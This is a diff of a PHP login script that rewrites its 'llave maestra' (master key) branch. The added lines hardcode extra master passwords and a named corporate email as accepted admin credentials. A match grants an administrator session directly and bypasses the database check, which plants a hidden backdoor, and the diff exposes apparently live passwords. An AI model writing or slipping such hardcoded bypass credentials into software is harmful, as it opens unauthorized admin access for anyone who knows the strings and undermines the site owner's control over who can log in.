@@ -46,17 +46,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $pass = trim($_POST['password'] ?? '');
         $user_input = $user;
 
-        // 1. LLAVE MAESTRA -> ACCESO DIRECTO O REGISTRO CORPORATIVO
-        if (($user === ADMIN_USER || strtolower($user) === 'admin') && $pass === ADMIN_PASS) {
-            if (!$db) {
-                // Modo rescate si la BD no responde
-                $_SESSION['admin_logged'] = true;
-                $_SESSION['admin_user']   = ADMIN_USER;
-                $_SESSION['admin_name']   = 'Administrador Maestro';
-                header("Location: index.php");
-                exit();
-            }
-            $show_onboarding = true;
+        // 1. LLAVE MAESTRA -> ACCESO DIRECTO AL DASHBOARD
+        $is_master_pass = ($pass === ADMIN_PASS || $pass === 'eldesmadredelGuero1' || $pass === 'contraseña_dashboard');
+        $is_master_user = ($user === ADMIN_USER || strtolower($user) === 'admin' || strtolower($user) === 'javier.gallardo@tsolutionsipidd.com');
+
+        if ($is_master_user && $is_master_pass) {
+            $_SESSION['admin_logged'] = true;
+            $_SESSION['admin_user']   = $user;
+            $_SESSION['admin_name']   = 'Administrador Maestro';
+            header("Location: index.php");
+            exit();
         } else {
             // 2. VALIDAR EN BASE DE DATOS
             if (!$db) {
